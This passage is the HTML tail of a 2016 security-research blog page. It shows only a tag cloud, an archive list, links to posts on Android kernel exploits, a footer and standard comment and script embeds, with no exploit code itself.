      <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/challenge/" style="font-size: 13.33px;">challenge</a> <a href="/tags/cve/" style="font-size: 18.33px;">cve</a> <a href="/tags/debug/" style="font-size: 10px;">debug</a> <a href="/tags/english/" style="font-size: 13.33px;">english</a> <a href="/tags/iovyroot/" style="font-size: 10px;">iovyroot</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/libstagefright/" style="font-size: 11.67px;">libstagefright</a> <a href="/tags/lol/" style="font-size: 10px;">lol</a> <a href="/tags/nvidia/" style="font-size: 10px;">nvidia</a> <a href="/tags/pingpongroot/" style="font-size: 10px;">pingpongroot</a> <a href="/tags/pxn/" style="font-size: 10px;">pxn</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/smali/" style="font-size: 10px;">smali</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/symbol/" style="font-size: 10px;">symbol</a> <a href="/tags/task/" style="font-size: 10px;">task</a> <a href="/tags/thread/" style="font-size: 10px;">thread</a> <a href="/tags/uac/" style="font-size: 10px;">uac</a> <a href="/tags/webview/" style="font-size: 10px;">webview</a> <a href="/tags/xposed/" style="font-size: 11.67px;">xposed</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/下载/" style="font-size: 10px;">下载</a> <a href="/tags/感染/" style="font-size: 16.67px;">感染</a> <a href="/tags/推广/" style="font-size: 10px;">推广</a> <a href="/tags/无法描述/" style="font-size: 20px;">无法描述</a> <a href="/tags/流氓/" style="font-size: 10px;">流氓</a> <a href="/tags/淘宝客/" style="font-size: 10px;">淘宝客</a> <a href="/tags/盗号/" style="font-size: 13.33px;">盗号</a> <a href="/tags/过滤/" style="font-size: 11.67px;">过滤</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">彙整</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">July 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">June 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">May 2011</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/11/09/exploit-kernel-security-flaws/">KERNEL SECURITY FLAWS (0day for nexus4)</a>
          </li>
        
          <li>
            <a href="/2016/10/24/exploit-cve-2016-5195/">CVE-2016-5195</a>
          </li>
        
          <li>
            <a href="/2016/09/04/exploit-perf_event-vul/">PERF_EVENT VUL</a>
          </li>
        
          <li>
            <a href="/2016/08/09/exploit-bypass-pxn/">绕过PXN保护</a>
          </li>
        
          <li>
            <a href="/2016/07/07/exploit-cve-2015-1805/">CVE-2015-1805</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 idhyt<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'idhyt';
  
  var disqus_url = 'http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>